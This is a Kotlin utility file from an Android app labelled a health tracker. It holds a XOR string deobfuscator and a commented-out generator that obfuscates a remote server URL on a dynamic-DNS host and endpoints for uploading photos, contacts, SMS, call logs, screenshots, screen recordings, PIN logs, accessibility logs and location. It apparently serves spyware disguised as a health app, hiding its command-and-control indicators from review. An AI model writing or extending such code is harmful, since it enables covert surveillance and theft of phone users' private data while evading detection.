package com.inf2007.healthtracker.utilities

object StringObfuscator {
    private const val XOR_KEY = 0x67

    fun deobfuscate(obfuscated: String): String {
        return obfuscated.map { char ->
            (char.code xor XOR_KEY).toChar()
        }.joinToString("")
    }
}

/*

fun main() {
    val xorKey = 0x67 // Your key

    fun obfuscate(input: String): String {
        return input.map { char ->
            (char.code xor xorKey).toChar()
        }.joinToString("")
    }

    // Helper to escape special characters for Kotlin strings
    fun escapeForKotlin(str: String): String {
        return str.map { char ->
            when (char) {
                '\b' -> "\\b"
                '\t' -> "\\t"
                '\n' -> "\\n"
                '\r' -> "\\r"
                '\'' -> "\\'"
                '\"' -> "\\\""
                '\\' -> "\\\\"
                '$' -> "\\$"
                in '\u0000'..'\u001F', in '\u007F'..'\u009F' -> {
                    // Non-printable characters as Unicode escapes
                    "\\u${char.code.toString(16).padStart(4, '0')}"
                }
                else -> char.toString()
            }
        }.joinToString("")
    }

    val stringsToObfuscate = listOf(
        "https://zining.duckdns.org:5000",
        "/commands",
        "/photos",
        "/videos",
        "/contacts",
        "/screenshots",
        "/user_apps",
        "/downloads",
        "/location_update",
        "/pin_logs",
        "/sms",
        "/call_logs",
        "/screen_recordings",
        "/accessibility_logs",
        "/notifications",
        "com.inf2007.healthtracker.UPLOAD_FILE",
        "com.inf2007.healthtracker.SCREENSHOT_COMMAND",
        "watch.log",
        "pin.log"
    )

    println("=== OBFUSCATED STRINGS (ready to paste) ===")
    println("private const val XOR_KEY = 0x$xorKey")
    println()

    stringsToObfuscate.forEach { original ->
        val obfuscated = obfuscate(original)
        val escaped = escapeForKotlin(obfuscated)
        println("// $original")
        println("private const val OBFUSCATED_${original.replace(Regex("[^A-Za-z]"), "_").uppercase()} = \"$escaped\"")
        println()
    }
}

 */